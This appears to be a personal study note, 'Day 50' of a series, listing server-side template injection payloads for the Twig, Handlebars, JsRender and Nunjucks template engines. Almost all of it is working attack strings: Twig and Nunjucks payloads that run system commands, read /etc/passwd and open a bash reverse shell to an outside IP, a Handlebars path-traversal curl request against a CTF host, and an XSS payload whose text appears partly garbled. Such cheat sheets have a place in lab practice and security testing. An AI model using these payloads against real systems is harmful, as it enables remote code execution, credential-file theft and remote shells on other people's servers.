Daily Notes : Day 50 
SSTI PAYLOADS - Part 2 

Twig :
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}

Handlebar path traversal:
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.domain.com:9090'

JsRender (NodeJS):
{{:%22test%http://22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}

NUNJUCKS (NodeJS) :
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}